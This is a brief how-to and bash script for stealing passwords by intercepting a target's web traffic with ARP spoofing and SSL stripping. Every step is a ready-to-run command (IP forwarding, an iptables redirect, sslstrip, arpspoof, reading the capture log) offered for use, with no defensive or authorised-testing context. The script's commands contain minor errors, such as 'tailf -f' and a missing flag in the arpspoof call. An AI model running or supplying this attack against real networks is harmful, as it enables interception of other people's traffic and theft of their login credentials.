Sniffing Password from HTTPS sites using SSL Strip

1. Enable IP forwarding

#echo 1 > /proc/sys/net/ipv4/ip_forward



2. Set Network Address Translation in Firewall(IPtables here)

#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000



3. Confirm the rule!

#iptables -L -t nat


4. Run SSL Strip on the port 

The port is already enabled in the firewall in previous step

#sslstrip -p -l 10000


5. Start ARP Poisoning 

#arpspoof -i <interface> -t <target_host> <gateway>

6. Listen for the sslstrip log

#tail -f sslstrip.log


7. Start Browsing and Capture it.



#!/bin/bash


read -p "Target" targetIP
read -p "Gateway" gatewayIP
echo Enabling IP forward
echo
echo 1 > /proc/sys/net/ipv4/ip_forward
echo
echo Adding port to the firewall
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo
echo Check the rule in firewall
iptables -L -t nat
echo
echo Starting SSL Strip
sslstrip -p -l 10000&
echo
echo Start the ARP Poisonging
arpspoof -i eth0 $targetIP $gatewayIP&
echo Listen to the SSLStrip Log
tailf -f sslstrip.log
